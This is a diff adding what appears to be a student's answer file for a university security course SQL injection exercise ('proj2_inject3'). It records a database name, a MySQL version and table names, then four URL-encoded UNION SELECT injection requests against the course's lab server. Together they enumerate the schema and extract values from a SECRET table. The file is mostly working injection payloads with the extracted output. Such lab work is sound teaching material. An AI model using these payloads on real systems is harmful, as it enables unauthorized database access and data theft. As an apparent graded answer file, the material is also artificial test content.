@@ -1,0 +1,9 @@
+proj2_inject3
+5.5.55-0ubuntu0.14.04.1
+HINT,SECRET,foo,inject3_users
+echo
+
+http://trurl.cs.illinois.edu/sqlinject3/?id=%27+union+select+1%2C+database%28%29%2C+%27garbage%27%2C+version%28%29+%23+
+http://trurl.cs.illinois.edu/sqlinject3/?id=%27+union+select+1%2C+database%28%29%2C+%27garbage%27%2C+version%28%29+%23+
+http://trurl.cs.illinois.edu/sqlinject3/?id=%27+union+select+1%2C+database%28%29%2C+%27garbage%27%2C+group_concat%28table_name%29+from+information_schema.tables+where+table_schema%3Ddatabase%28%29+%23
+http://trurl.cs.illinois.edu/sqlinject3/?id=%27+union+select+1%2C+database()%2C+%27garbage%27%2C+group_concat(secret)+from+SECRET+where+id=md5(%27kjhand2%27)+%23
